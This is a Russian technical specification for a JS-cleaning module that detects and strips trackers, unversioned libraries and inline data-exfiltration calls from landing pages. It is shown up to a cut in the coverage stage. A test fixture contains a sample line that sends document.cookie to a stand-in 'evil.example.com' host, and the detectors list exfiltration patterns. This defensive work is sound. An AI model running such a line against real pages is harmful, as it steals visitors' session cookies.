# ТЗ: Расширенная очистка JS (Advanced JS Cleaning)

> Документ описывает реализацию по этапам. Каждый этап самодостаточен и проверяем.
> Основа: существующий `src/mastra/cleaners/` — изучи его перед началом.

---

## Контекст и предусловия

Перед началом работы обязательно прочитай:
- `docs/cleaning-logic.md` — поведение всех существующих проходов
- `src/mastra/cleaners/types.ts` — типы `CleanStats`, `ChangelogEntry`, `PassContext`, `HtmlPass`
- `src/mastra/cleaners/pipeline.ts` — как устроен оркестратор
- `src/mastra/cleaners/passes/js/clean-js.ts` — как выглядит JS-проход
- `src/mastra/cleaners/passes/html/replace-local-libs-with-cdn.ts` — паттерн CDN-замены

**Принципы кодовой базы (строго соблюдать):**
1. Никакого `any` — Zod не используется в cleaners, но TypeScript строгий.
2. Все pure-функции принимают строку контента и возвращают изменённую — без side-effect.
3. Side-effects (запись файла) — только в оркестраторе `pipeline.ts` или wrapper-функции.
4. Changelog-запись на каждое изменение: `{ file, type, description, codeSnippet, lineNumber }`.
5. `npm run build` зелёный после каждого этапа.

---

## Обзор этапов

| # | Этап | Что решает | Сложность |
|---|------|-----------|-----------|
| 1 | Foundation (AST + типы + тесты) | Инфраструктура для всех остальных | Средняя |
| 2 | Metric-file remover (по файлу) | Пункт 4 пользователя | Лёгкая |
| 3 | Unversioned libs → CDN | Пункт 3 пользователя | Лёгкая |
| 4 | Inline exfil в HTML (AST surgical) | Пункт 5 пользователя | Средняя |
| 5 | Coverage-based dead file detection | Пункт 1 пользователя | Высокая |
| 6 | Partial useful extractor | Пункт 2 пользователя | Высокая |
| 7 | Advanced detectors | Новые угрозы | Средняя |
| 8 | Visual diff + интеграция в pipeline | Финальная сборка | Средняя |

---

## Этап 1 — Foundation: AST-инфраструктура

### Цель
Установить зависимости и создать переиспользуемые обёртки для парсинга JS в AST.
Без этого этапа все остальные не реализуемы.

### Почему acorn, а не babel или typescript-eslint?
- `acorn` — маленький (30 KB), без зависимостей, стандарт ESTree.
- `@babel/parser` — избыточен (поддержка JSX/Flow/TS не нужна для лендингов).
- `typescript-eslint` — слишком тяжёлый, не нужен.
- `acorn-walk` — официальный visitor для acorn, 200 строк.
- `magic-string` — хирургические замены с сохранением позиций (важно для sourcemap, если потребуются).

### 1.1 Установка зависимостей

```bash
npm install acorn acorn-walk magic-string
npm install -D @types/acorn
```

**Не делать:** `npm install @babel/parser` — излишне. Не добавлять `recast` — его overhead не нужен.

### 1.2 Файлы для создания

```
src/mastra/cleaners/passes/js-advanced/
├── ast/
│   ├── parse.ts          ← парсер с error-recovery
│   └── types.ts          ← локальные типы для AST-анализа
├── detectors/             ← (создать папку, файлы добавляются в этапах 2-7)
└── index.ts               ← реэкспорт публичного API (создать пустым)
```

### 1.3 `ast/types.ts`

```typescript
import type { Node } from 'acorn';

/** Результат одного детектора */
export interface DetectionResult {
  /** Строка в исходнике (1-indexed) */
  line: number;
  /** Символьная позиция начала узла */
  start: number;
  /** Символьная позиция конца узла */
  end: number;
  /** Тип угрозы: 'exfil' | 'dead' | 'obfuscated' | 'metric' | 'keylogger' | ... */
  threatType: string;
  /** Короткое описание для лога */
  description: string;
  /** Исходный фрагмент кода (≤ 200 символов) */
  snippet: string;
  /** Если true — узел должен быть удалён, false — только предупреждение */
  shouldRemove: boolean;
  /** AST-узел */
  node: Node;
}

/** Контекст для детекторов */
export interface DetectorContext {
  /** Исходный код файла */
  source: string;
  /** Относительный путь для лога */
  relPath: string;
  /** Хост лендинга (например, example.com) */
  mainHost: string;
}
```

### 1.4 `ast/parse.ts`

```typescript
import * as acorn from 'acorn';
import type { Program } from 'acorn';

/** Парсит JS-строку, возвращает AST или null (с предупреждением). */
export function parseJs(source: string, filePath: string): Program | null {
  // Пробуем module, потом script — лендинги бывают разные
  for (const sourceType of ['module', 'script'] as const) {
    try {
      return acorn.parse(source, {
        ecmaVersion: 2024,
        sourceType,
        // Важно: locations нужны для вычисления номера строки
        locations: true,
        // Если синтаксис сломан — не падаем, возвращаем null
        onInsertedSemicolon: () => {},
        onTrailingComma: () => {},
      });
    } catch {
      // Пробуем следующий sourceType
    }
  }
  // Если оба упали — файл не парсится (обфусцированный / минифицированный без пробелов)
  console.warn(`[js-advanced] Не удалось распарсить: ${filePath}`);
  return null;
}

/** Извлекает 1-indexed номер строки по символьной позиции */
export function posToLine(source: string, pos: number): number {
  return source.slice(0, pos).split('\n').length;
}

/** Безопасный срез кода для лога (≤ 200 символов) */
export function snippetAt(source: string, start: number, end: number): string {
  return source.slice(start, Math.min(end, start + 200)).replace(/\s+/g, ' ').trim();
}
```

**Важно:** если `parseJs` вернул `null` — остальные детекторы для этого файла пропускаются,
файл остаётся нетронутым. Никогда не падаем из-за одного невалидного файла.

### 1.5 Обновить `types.ts` (добавить новые поля в `CleanStats`)

Открой `src/mastra/cleaners/types.ts` и добавь поля в конец интерфейса `CleanStats`:

```typescript
// --- Advanced JS cleaning ---
/** JS-файлы удалены как мёртвый код (0% coverage, нет event-handlers) */
deadJsFilesRemoved: number;
/** JS-файлы частично очищены (удалены exfil/dead функции, файл оставлен) */
partialJsCleaned: number;
/** Inline <script> блоки в HTML, из которых удалены exfil-вызовы */
inlineExfilRemoved: number;
/** Библиотеки без версии (jquery.js, vendor.js) заменены на CDN */
unversionedLibsCdn: number;
/** Метрик-файлы удалены (по AST-сигнатуре, не только по имени) */
metricFilesRemoved: number;
/** Предупреждения от детекторов (obfuscation, keylogger и т.д.) */
detectorWarnings: number;
```

И добавь значения этих полей в `cleanSite()` в `pipeline.ts` (инициализация stats: все `0`).

### 1.6 Тесты для `parse.ts`

Создай `src/mastra/cleaners/passes/js-advanced/ast/__tests__/parse.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { parseJs, posToLine, snippetAt } from '../parse.js';

describe('parseJs', () => {
  it('парсит корректный JS', () => {
    const ast = parseJs('const x = 1;', 'test.js');
    expect(ast).not.toBeNull();
    expect(ast?.type).toBe('Program');  
  });

  it('пробует module, потом script', () => {
    // import — только в module mode
    const ast = parseJs('import x from "y";', 'test.js');
    expect(ast).not.toBeNull();
  });

  it('возвращает null для сломанного JS', () => {
    const ast = parseJs('{{{{', 'broken.js');
    expect(ast).toBeNull();
  });
});

describe('posToLine', () => {
  it('правильно считает строку', () => {
    expect(posToLine('a\nb\nc', 4)).toBe(3); // позиция 'c'
  });
});
```

Запуск: `npx vitest run src/mastra/cleaners/passes/js-advanced/ast/__tests__/parse.test.ts`

### 1.7 Acceptance criteria

- [ ] `npm install` завершается без ошибок.
- [ ] `npm run build` зелёный.
- [ ] Тесты parse.test.ts зелёные.
- [ ] `CleanStats` имеет все новые поля без TypeScript-ошибок.

---

## Этап 2 — Metric-file remover

### Цель
Удалять JS-файлы, которые содержат **только** трекерные глобалы и ничего полезного.
Это улучшение существующего `TRACKER_FILENAME_PATTERNS` (он ловит по имени файла),
а здесь ловим по **содержимому** — для переименованных `fbevents.js → assets/v2.js`.

### Что считается метрик-файлом (по AST)
Файл является метрик-файлом если он:
1. Регистрирует известный трекерный глобал: `window.fbq`, `window.gtag`, `window.dataLayer`,
   `window.ym`, `window._paq`, `window.mixpanel`, `window.amplitude`, `window.clarity`, `window._hsq`
2. **И** не экспортирует ничего полезного (нет `export`, нет `module.exports`)
3. **И** не содержит DOM-манипуляций (`document.querySelector`, `getElementById`) кроме document.write
4. **И** не содержит обработчиков событий (`addEventListener`)

Логика: «если файл только объявляет трекер и шлёт данные — он не нужен».

### 2.1 Файлы для создания

```
src/mastra/cleaners/passes/js-advanced/detectors/
└── detect-metric-file.ts
```

### 2.2 `detect-metric-file.ts`

```typescript
import * as walk from 'acorn-walk';
import type { Program, Node } from 'acorn';

/** Глобалы-трекеры, присвоение которых = сигнатура метрик-файла */
const METRIC_GLOBALS = new Set([
  'fbq', 'dataLayer', 'gtag', 'ym', '_paq', '_gaq',
  'mixpanel', 'amplitude', 'clarity', '_hsq', 'heap',
  'Intercom', 'zE', 'hj', 'hjid',
]);

const USEFUL_PATTERNS = [
  // Признаки полезного кода
  'addEventListener',
  'querySelector',
  'getElementById',
  'getElementsBy',
  'module.exports',
];

export interface MetricFileCheck {
  isMetricFile: boolean;
  reason: string;
}

export function detectMetricFile(ast: Program, source: string): MetricFileCheck {
  let hasMetricGlobal = false;
  let hasExport = false;
  let hasUsefulCode = false;

  // Ищем присвоение window.X = ... где X — метрик-глобал
  walk.simple(ast, {
    AssignmentExpression(node: Node) {
      const n = node as any;
      if (
        n.left?.type === 'MemberExpression' &&
        n.left.object?.name === 'window' &&
        METRIC_GLOBALS.has(n.left.property?.name)
      ) {
        hasMetricGlobal = true;
      }
      // window.fbq = window.fbq || function(){...}
      if (n.left?.name && METRIC_GLOBALS.has(n.left.name)) {
        hasMetricGlobal = true;
      }
    },
    ExportDefaultDeclaration() { hasExport = true; },
    ExportNamedDeclaration() { hasExport = true; },
  });

  // Грубая проверка полезных паттернов через текст (быстро)
  for (const pat of USEFUL_PATTERNS) {
    if (source.includes(pat)) {
      hasUsefulCode = true;
      break;
    }
  }

  if (hasMetricGlobal && !hasExport && !hasUsefulCode) {
    return { isMetricFile: true, reason: 'Только трекерный глобал, без полезного кода' };
  }
  return { isMetricFile: false, reason: '' };
}
```

### 2.3 Интеграция в `cleanJsFile`

Открой `src/mastra/cleaners/passes/js/clean-js.ts` и добавь вызов:

```typescript
// В конце функции cleanJsFile, перед финальным writeFile:
import { parseJs } from '../js-advanced/ast/parse.js';
import { detectMetricFile } from '../js-advanced/detectors/detect-metric-file.js';

// После warnSuspiciousPatterns:
const ast = parseJs(content, relPath);
if (ast) {
  const check = detectMetricFile(ast, content);
  if (check.isMetricFile) {
    log.push({
      file: relPath,
      type: 'METRIC_FILE',
      description: check.reason,
      lineNumber: 1,
    });
    // Возвращаем специальный маркер для pipeline — файл надо удалить
    // (удаление из pipeline.ts на основании возвращённого значения > 1000)
    return 9999; // сигнал pipeline'у удалить файл и <script> в HTML
  }
}
```

**Альтернатива** (чище): вместо magic-числа добавить отдельный return-тип. Но для совместимости с `CleanStats.jsItemsRemoved: number` проще добавить флаг в отдельный Map. Выбери сам — главное задокументировать.

**Что НЕ делать:** не удалять файл прямо внутри `cleanJsFile` — это нарушает правило «IO только в pipeline.ts». Собери список файлов-кандидатов в Set, передай в pipeline.

### 2.4 Тесты

```typescript
// __tests__/detect-metric-file.test.ts
import { describe, it, expect } from 'vitest';
import { parseJs } from '../ast/parse.js';
import { detectMetricFile } from '../detectors/detect-metric-file.js';

const FBEVENTS_LIKE = `
!function(f,b,e,v,n,t,s){
  if(f.fbq)return;n=f.fbq=function(){...};
  f._fbq=n;
}(window);
window.fbq('init','123456');
window.fbq('track','PageView');
`;

const USEFUL_JS = `
window.fbq = function(){};  // трекер есть
document.addEventListener('click', function() { /* полезно */ });
`;

it('детектирует чистый метрик-файл', () => {
  const ast = parseJs(FBEVENTS_LIKE, 'test.js');
  expect(detectMetricFile(ast!, FBEVENTS_LIKE).isMetricFile).toBe(true);
});

it('НЕ детектирует файл с полезным кодом', () => {
  const ast = parseJs(USEFUL_JS, 'test.js');
  expect(detectMetricFile(ast!, USEFUL_JS).isMetricFile).toBe(false);
});
```

### 2.5 Acceptance criteria

- [ ] `fbevents.js`, переименованный в `assets/v.min.js`, детектируется.
- [ ] `main.js` с одним вызовом `fbq` И обработчиком форм — не детектируется.
- [ ] В `clean-site-changes.log` появляется запись с типом `METRIC_FILE`.
- [ ] Тесты зелёные.

---

## Этап 3 — Unversioned libs → CDN

### Цель
Расширить существующий `replaceLocalLibsWithCdn` (HTML-проход) для обработки случаев,
когда jQuery/Bootstrap подключены под **произвольным именем** (без версии в имени файла).

**Сейчас** проход умеет: `jquery-3.6.0.min.js` → CDN.
**Нужно добавить:** `jquery.js`, `vendor.js`, `lib.js` → CDN, если внутри — jQuery.

### Подход
Двухфазный:
1. **Pre-scan phase** (до HTML-проходов): проходим по всем `.js` файлам, ищем jQuery-сигнатуру,
   строим карту `{ filePath → detectedLib }`.
2. **HTML phase**: `replaceLocalLibsWithCdn` получает эту карту и дополнительно заменяет
   `<script src="путь/к/файлу">` если `путь` есть в карте.

### 3.1 Файлы для создания/изменения

```
src/mastra/cleaners/passes/js-advanced/detectors/
└── detect-unversioned-lib.ts    ← НОВЫЙ

src/mastra/cleaners/registry/
└── known-libs.ts                ← НОВЫЙ (заменит часть cdn-libraries.ts)

src/mastra/cleaners/passes/html/
└── replace-local-libs-with-cdn.ts  ← ИЗМЕНИТЬ (добавить параметр)

src/mastra/cleaners/pipeline.ts  ← ИЗМЕНИТЬ (pre-scan + передача карты)
```

### 3.2 `registry/known-libs.ts`

```typescript
export interface KnownLib {
  name: string;
  /** Regex по содержимому JS-файла для опознания библиотеки */
  contentSignature: RegExp;
  /** Regex по содержимому для извлечения версии */
  versionExtractor: RegExp;
  /** Версия по умолчанию если не нашли в файле */
  fallbackVersion: string;
  /** Функция генерации CDN URL по версии */
  cdnUrl: (version: string) => string;
  /** Функция генерации CDN URL для CSS (если применимо) */
  cdnCssUrl?: (version: string) => string;
}

export const KNOWN_LIBS: KnownLib[] = [
  {
    name: 'jquery',
    contentSignature: /jQuery\.fn\.jquery\s*=|jQuery JavaScript Library/i,
    versionExtractor: /jQuery(?:\.fn\.jquery)?\s*=\s*["']([\d.]+)["']/,
    fallbackVersion: '3.7.1',
    cdnUrl: (v) => `https://code.jquery.com/jquery-${v}.min.js`,
  },
  {
    name: 'bootstrap-js',
    contentSignature: /Bootstrap v[\d.]+ \(https:\/\/getbootstrap\.com\)/,
    versionExtractor: /Bootstrap v([\d.]+)/,
    fallbackVersion: '5.3.3',
    cdnUrl: (v) => `https://cdn.jsdelivr.net/npm/bootstrap@${v}/dist/js/bootstrap.bundle.min.js`,
  },
  {
    name: 'popper',
    contentSignature: /\* Popper\.js v[\d.]+|@popperjs\/core/,
    versionExtractor: /Popper\.js v([\d.]+)|@popperjs\/core@([\d.]+)/,
    fallbackVersion: '2.11.8',
    cdnUrl: (v) => `https://cdn.jsdelivr.net/npm/@popperjs/core@${v}/dist/umd/popper.min.js`,
  },
  {
    name: 'swiper',
    contentSignature: /Swiper\s+[\d.]+|Swiper JavaScript Library/i,
    versionExtractor: /Swiper\s+([\d.]+)/,
    fallbackVersion: '11.1.4',
    cdnUrl: (v) => `https://cdn.jsdelivr.net/npm/swiper@${v}/swiper-bundle.min.js`,
    cdnCssUrl: (v) => `https://cdn.jsdelivr.net/npm/swiper@${v}/swiper-bundle.min.css`,
  },
  {
    name: 'lodash',
    contentSignature: /Lodash [\d.]+ \(Custom Build\)|lodash\.com\/docs/,
    versionExtractor: /Lodash ([\d.]+)/,
    fallbackVersion: '4.17.21',
    cdnUrl: (v) => `https://cdn.jsdelivr.net/npm/lodash@${v}/lodash.min.js`,
  },
];
```

### 3.3 `detectors/detect-unversioned-lib.ts`

```typescript
import { readFile } from 'node:fs/promises';
import { KNOWN_LIBS, type KnownLib } from '../../registry/known-libs.js';

export interface DetectedLib {
  lib: KnownLib;
  version: string;
}

/** Проверяет JS-файл по сигнатуре содержимого */
export async function detectUnversionedLib(filePath: string): Promise<DetectedLib | null> {
  let content: string;
  try {
    content = await readFile(filePath, 'utf8');
  } catch {
    return null;
  }

  // Только первые 4 КБ — сигнатура обычно в заголовке комментария
  const head = content.slice(0, 4096);

  for (const lib of KNOWN_LIBS) {
    if (!lib.contentSignature.test(head)) continue;

    const versionMatch = lib.versionExtractor.exec(head);
    const version = versionMatch?.[1] ?? versionMatch?.[2] ?? lib.fallbackVersion;
    return { lib, version };
  }
  return null;
}
```

**Что НЕ делать:** не читать файлы целиком для поиска сигнатуры — у jQuery 90 KB.
Читай первые 4 КБ, сигнатура всегда в `/*!` комментарии заголовка.

### 3.4 Изменить `pipeline.ts` — pre-scan

Добавь в начало `cleanSite()`, ПЕРЕД `for await (const file of walkFiles(siteDir))`:

```typescript
// Pre-scan: определяем библиотеки без версии в имени
const unversionedLibMap = new Map<string, DetectedLib>();
for await (const file of walkFiles(siteDir)) {
  const ext = extname(file).toLowerCase();
  if (ext !== '.js' && ext !== '.mjs') continue;
  // Пропускаем уже известные по имени (replace-local-libs-with-cdn ими займётся)
  const basename = path.basename(file);
  if (/[\d]+\.[\d]+\.[\d]+/.test(basename)) continue; // версия в имени
  const detected = await detectUnversionedLib(file);
  if (detected) {
    unversionedLibMap.set(relative(siteDir, file), detected);
  }
}
```

Затем передай `unversionedLibMap` в контекст `PassContext` (добавь поле `unversionedLibs`) и используй в `replaceLocalLibsWithCdn`.

### 3.5 Тесты

```typescript
it('детектирует jQuery без версии в имени', async () => {
  // Создать временный файл с jQuery-заголовком
  const content = '/*! jQuery JavaScript Library v3.6.0 ... */\n(function(){...})';
  // writeFile tmpPath, readFile → detectUnversionedLib
  const result = await detectUnversionedLib(tmpPath);
  expect(result?.lib.name).toBe('jquery');
  expect(result?.version).toBe('3.6.0');
});
```

### 3.6 Acceptance criteria

- [ ] `vendor.js` содержащий jQuery 3.6 → заменён на CDN, файл удалён.
- [ ] `bootstrap.js` без версии → заменён на CDN.
- [ ] `app.js` — обычный скрипт приложения → не тронут.
- [ ] В HTML появляется `integrity` атрибут (SRI).

---

## Этап 4 — Inline exfil в HTML (AST surgical)

### Цель
Внутри HTML-файлов найти inline `<script>` блоки (без `src`), которые **содержат**
вызовы для сбора и отправки данных, и хирургически удалить эти вызовы.
Остальной код скрипта сохранить.

### Что удаляем (AST-узлы)
- `fetch('https://external.com/...')` — если домен не в `TRUSTED_HOSTS`
- `new XMLHttpRequest()` + `.open(...)` с внешним URL
- `navigator.sendBeacon('https://...')` с внешним URL
- `new WebSocket('wss://external.com')` с внешним хостом
- `new Image().src = 'https://external.com/...'` (трекинг-пиксель через JS)
- `document.write('<script src="https://external.com/...">')` — инжект скрипта
- Вызовы глобалов из `suspicious-globals.ts`: `fbq(...)`, `gtag(...)`, `ym(...)` и т.д.

**Что НЕ удаляем:**
- `fetch('/api/contact', ...)` — внутренний запрос формы
- `fetch('https://fonts.googleapis.com/...')` — trusted host
- `console.log(...)`, `alert(...)` — безвредны

### 4.1 Файлы для создания

```
src/mastra/cleaners/passes/js-advanced/detectors/
└── detect-exfil-calls.ts

src/mastra/cleaners/passes/js-advanced/
└── remove-inline-exfil.ts     ← pure-функция: строка → строка
```

### 4.2 Реестр подозрительных глобалов

Создай `src/mastra/cleaners/registry/suspicious-globals.ts`:

```typescript
/** Глобальные функции трекеров — их вызовы в inline <script> удалять */
export const SUSPICIOUS_CALL_GLOBALS = new Set([
  'fbq', 'gtag', '_gaq', 'ga', 'ym', '_paq', 'twq',
  'mixpanel', 'amplitude', 'clarity', '_hsq', 'heap',
  'Intercom', 'zE', 'hj', 'PostAffTracker', 'SplitHero',
  'lintrk', 'ttq', 'snaptr', 'pintrk',
]);
```

### 4.3 `detectors/detect-exfil-calls.ts`

```typescript
import * as walk from 'acorn-walk';
import type { Program, Node } from 'acorn';
import { TRUSTED_HOSTS } from '../../registry/trusted-hosts.js';
import { SUSPICIOUS_CALL_GLOBALS } from '../../registry/suspicious-globals.js';
import type { DetectionResult, DetectorContext } from '../ast/types.js';
import { posToLine, snippetAt } from '../ast/parse.js';

function isExternalUrl(url: string, mainHost: string): boolean {
  try {
    const parsed = new URL(url);
    const host = parsed.hostname;
    // Проверяем: не trusted host, не mainHost, не относительный
    if (TRUSTED_HOSTS.some(h => host === h || host.endsWith('.' + h))) return false;
    if (host === mainHost || host.endsWith('.' + mainHost)) return false;
    return true;
  } catch {
    return false; // относительный URL — не внешний
  }
}

function extractStringArg(node: any): string | null {
  if (node?.type === 'Literal' && typeof node.value === 'string') return node.value;
  return null;
}

export function detectExfilCalls(
  ast: Program,
  ctx: DetectorContext,
): DetectionResult[] {
  const results: DetectionResult[] = [];

  walk.simple(ast, {
    CallExpression(node: Node) {
      const n = node as any;
      const { source, relPath, mainHost } = ctx;

      // fetch('https://external...')
      if (n.callee?.name === 'fetch') {
        const url = extractStringArg(n.arguments[0]);
        if (url && isExternalUrl(url, mainHost)) {
          results.push({
            line: posToLine(source, n.start),
            start: n.start, end: n.end,
            threatType: 'exfil-fetch',
            description: `fetch() на внешний хост: ${url}`,
            snippet: snippetAt(source, n.start, n.end),
            shouldRemove: true,
            node,
          });
        }
      }

      // navigator.sendBeacon(url)
      if (
        n.callee?.type === 'MemberExpression' &&
        n.callee.object?.name === 'navigator' &&
        n.callee.property?.name === 'sendBeacon'
      ) {
        const url = extractStringArg(n.arguments[0]);
        if (!url || isExternalUrl(url, mainHost)) {
          results.push({
            line: posToLine(source, n.start),
            start: n.start, end: n.end,
            threatType: 'exfil-beacon',
            description: `sendBeacon() на внешний хост`,
            snippet: snippetAt(source, n.start, n.end),
            shouldRemove: true,
            node,
          });
        }
      }

      // fbq(...), gtag(...), ym(...) и другие трекерные глобалы
      if (n.callee?.name && SUSPICIOUS_CALL_GLOBALS.has(n.callee.name)) {
        results.push({
          line: posToLine(source, n.start),
          start: n.start, end: n.end,
          threatType: 'tracker-call',
          description: `Вызов трекера: ${n.callee.name}(...)`,
          snippet: snippetAt(source, n.start, n.end),
          shouldRemove: true,
          node,
        });
      }

      // new WebSocket('wss://external...')
      if (n.callee?.type === 'Identifier' && n.callee.name === 'WebSocket') {
        const url = extractStringArg(n.arguments[0]);
        if (url && isExternalUrl(url.replace('wss://', 'https://').replace('ws://', 'http://'), mainHost)) {
          results.push({
            line: posToLine(source, n.start),
            start: n.start, end: n.end,
            threatType: 'exfil-websocket',
            description: `WebSocket на внешний хост: ${url}`,
            snippet: snippetAt(source, n.start, n.end),
            shouldRemove: true,
            node,
          });
        }
      }
    },

    AssignmentExpression(node: Node) {
      const n = node as any;
      // new Image().src = 'https://external.com/pixel'
      if (
        n.left?.type === 'MemberExpression' &&
        n.left.property?.name === 'src' &&
        n.left.object?.type === 'NewExpression' &&
        n.left.object?.callee?.name === 'Image'
      ) {
        const url = extractStringArg(n.right);
        if (url && isExternalUrl(url, ctx.mainHost)) {
          results.push({
            line: posToLine(ctx.source, n.start),
            start: n.start, end: n.end,
            threatType: 'exfil-pixel',
            description: `Tracking pixel через new Image().src`,
            snippet: snippetAt(ctx.source, n.start, n.end),
            shouldRemove: true,
            node,
          });
        }
      }
    },
  });

  return results;
}
```

**Что НЕ делать:**
- Не пытаться вычислить динамические URL вида `fetch('/api/' + userId + '/track')` — это статически невычислимо. Обрабатываем только строковые литералы.
- Не удалять `fetch` если URL — переменная. Логируй как предупреждение.

### 4.4 `remove-inline-exfil.ts`

```typescript
import MagicString from 'magic-string';
import type { Program } from 'acorn';
import { detectExfilCalls } from './detectors/detect-exfil-calls.js';
import type { DetectorContext } from './ast/types.js';
import type { ChangelogEntry } from '../../types.js';

export interface InlineExfilResult {
  code: string;
  removed: number;
}

export function removeInlineExfil(
  scriptContent: string,
  ctx: DetectorContext,
  ast: Program,
  log: ChangelogEntry[],
): InlineExfilResult {
  const detections = detectExfilCalls(ast, ctx);
  const toRemove = detections.filter(d => d.shouldRemove);

  if (toRemove.length === 0) return { code: scriptContent, removed: 0 };

  const ms = new MagicString(scriptContent);

  // Удаляем от конца к началу — чтобы позиции не сдвигались
  const sorted = [...toRemove].sort((a, b) => b.start - a.start);

  for (const detection of sorted) {
    // Удаляем весь statement (включая ; и перенос строки)
    let end = detection.end;
    // Захватываем trailing ; и пробелы
    while (end < scriptContent.length && /[;\s]/.test(scriptContent[end]!)) end++;
    ms.remove(detection.start, end);

    log.push({
      file: ctx.relPath,
      type: detection.threatType.toUpperCase(),
      description: detection.description,
      codeSnippet: detection.snippet,
      lineNumber: detection.line,
    });
  }

  const result = ms.toString();
  // Если после удаления остался только пустой/пробельный блок — вернуть пустую строку
  const isEmpty = result.trim().length === 0;
  return { code: isEmpty ? '' : result, removed: toRemove.length };
}
```

### 4.5 Интеграция в HTML pipeline

Создай новый HTML-проход `src/mastra/cleaners/passes/html/remove-inline-exfil-pass.ts`:

```typescript
import type { HtmlPass, HtmlPassResult, PassContext } from '../../types.js';
import { parseJs } from '../js-advanced/ast/parse.js';
import { removeInlineExfil } from '../js-advanced/remove-inline-exfil.js';

const INLINE_SCRIPT_RE = /<script(?![^>]*\bsrc\b)[^>]*>([\s\S]*?)<\/script>/gi;

export const removeInlineExfilPass: HtmlPass = (html, ctx): HtmlPassResult => {
  let result = html;
  let removed = 0;

  result = result.replace(INLINE_SCRIPT_RE, (fullMatch, scriptBody: string) => {
    if (!scriptBody.trim()) return fullMatch;

    const ast = parseJs(scriptBody, ctx.relPath);
    if (!ast) return fullMatch; // не смогли распарсить — не трогаем

    const { code, removed: r } = removeInlineExfil(
      scriptBody,
      { source: scriptBody, relPath: ctx.relPath, mainHost: ctx.mainHost },
      ast,
      ctx.log,
    );
    removed += r;

    if (r === 0) return fullMatch;
    if (!code.trim()) return ''; // весь блок стал пустым
    return fullMatch.replace(scriptBody, code);
  });

  return { html: result, counts: { inlineScriptsRemoved: removed } };
};
```

Добавь в `pipeline.ts` в массив `HTML_PASSES` **после** `removeInlineTrackers` (позиция 3):

```typescript
import { removeInlineExfilPass } from './passes/html/remove-inline-exfil-pass.js';
// В HTML_PASSES после removeInlineTrackers:
removeInlineExfilPass,
```

### 4.6 Тесты

```typescript
it('удаляет fetch на внешний хост, сохраняет остальное', () => {
  const script = `
    function showMenu() { document.querySelector('.menu').style.display='block'; }
    fetch('https://evil.example.com/track?data='+document.cookie);
    showMenu();
  `;
  // result.code не должен содержать fetch и document.cookie
  // result.code должен содержать showMenu
  expect(result.code).not.toContain('evil.example.com');
  expect(result.code).toContain('showMenu');
});

it('НЕ трогает fetch на внутренний хост', () => {
  const script = `fetch('/api/subscribe', { method: 'POST' });`;
  expect(result.removed).toBe(0);
});

it('НЕ трогает fetch на trusted хост', () => {
  const script = `fetch('https://fonts.googleapis.com/css2?family=Roboto');`;
  expect(result.removed).toBe(0);
});
```

### 4.7 Acceptance criteria

- [ ] Inline `fetch('https://tracker.io/')` в HTML удалён.
- [ ] `fbq('track', 'Purchase')` в inline script удалён.
- [ ] `/api/subscribe` endpoint в `fetch` — не тронут.
- [ ] Скрипт с нечитаемым (непарсируемым) JS — не тронут вообще.
- [ ] Тесты зелёные.

---

## Этап 5 — Coverage-based dead file detection

### Цель
Запустить лендинг в Playwright, собрать реальное JS-покрытие,
найти файлы с 0% покрытием и пометить их к удалению.

**Это самый сложный этап с точки зрения инфраструктуры.**
Реализуется как отдельная функция, вызываемая из `cleanSite()` **опционально** (флаг `--coverage`).

### Почему опционально?
- Playwright + рендер занимают 15–30 секунд. Не каждый прогон это нужно.
- Некоторые лендинги требуют реального сервера (PHP-функции, query-params).
- По умолчанию `--coverage` выключен.

### 5.1 Файлы для создания

```
src/mastra/cleaners/passes/js-advanced/coverage/
├── collect-coverage.ts      ← Playwright сбор покрытия
└── analyze-coverage.ts      ← анализ: какие файлы мёртвые
```

### 5.2 `coverage/collect-coverage.ts`

```typescript
import * as http from 'node:http';
import * as path from 'node:path';
import * as fs from 'node:fs';
import { chromium, type Browser, type Page } from 'playwright';

export interface ScriptCoverage {
  /** URL скрипта как на странице (абсолютный или относительный) */
  url: string;
  /** Относительный путь к файлу в siteDir (или null если inline) */
  relPath: string | null;
  /** Количество символов в файле */
  totalChars: number;
  /** Количество символов в выполненных диапазонах */
  coveredChars: number;
  /** Процент покрытия (0–100) */
  percent: number;
}

/** Поднимает статический HTTP-сервер на случайном порту */
async function serveDir(siteDir: string): Promise<{ url: string; close: () => void }> {
  const server = http.createServer((req, res) => {
    const safePath = path.join(siteDir, decodeURIComponent(req.url!.split('?')[0]!));
    if (!safePath.startsWith(siteDir)) { res.writeHead(403); res.end(); return; }
    const file = fs.existsSync(safePath) && fs.statSync(safePath).isFile()
      ? safePath
      : path.join(siteDir, 'index.html'); // fallback
    const content = fs.readFileSync(file);
    const ext = path.extname(file).toLowerCase();
    const mime: Record<string, string> = { '.js': 'application/javascript', '.html': 'text/html', '.css': 'text/css' };
    res.writeHead(200, { 'Content-Type': mime[ext] ?? 'application/octet-stream' });
    res.end(content);
  });
  return new Promise(resolve => {
    server.listen(0, '127.0.0.1', () => {
      const port = (server.address() as any).port;
      resolve({ url: `http://127.0.0.1:${port}`, close: () => server.close() });
    });
  });
}

export async function collectCoverage(siteDir: string): Promise<ScriptCoverage[]> {
  const { url: baseUrl, close } = await serveDir(siteDir);
  let browser: Browser | null = null;
  let page: Page | null = null;

  try {
    browser = await chromium.launch({ headless: true });
    page = await browser.newPage();

    // Блокируем внешние запросы — нас интересует только локальный код
    await page.route('**/*', (route) => {
      const url = route.request().url();
      if (url.startsWith(baseUrl)) return route.continue();
      return route.abort(); // блокировать внешние
    });

    await page.coverage.startJSCoverage({ resetOnNavigation: false });

    await page.goto(baseUrl, { waitUntil: 'networkidle', timeout: 30000 });

    // Автоскролл до конца страницы (триггер lazy-load)
    await page.evaluate(() => {
      return new Promise<void>(resolve => {
        let totalHeight = 0;
        const distance = 300;
        const timer = setInterval(() => {
          window.scrollBy(0, distance);
          totalHeight += distance;
          if (totalHeight >= document.body.scrollHeight) {
            clearInterval(timer);
            resolve();
          }
        }, 100);
      });
    });

    // Кликаем по интерактивным элементам в режиме preventDefault
    const clickables = await page.$$('button, [role="button"], .btn, .cta');
    for (const el of clickables.slice(0, 5)) { // не более 5 кликов
      try {
        await el.dispatchEvent('click');
      } catch { /* ignore */ }
    }

    await page.waitForTimeout(1000);

    const rawCoverage = await page.coverage.stopJSCoverage();

    return rawCoverage.map(entry => {
      const totalChars = entry.source?.length ?? 0;
      let coveredChars = 0;
      for (const range of entry.ranges) {
        coveredChars += range.end - range.start;
      }
      const percent = totalChars > 0 ? (coveredChars / totalChars) * 100 : 0;

      // Определяем relPath: убираем baseUrl из URL
      const relPath = entry.url.startsWith(baseUrl)
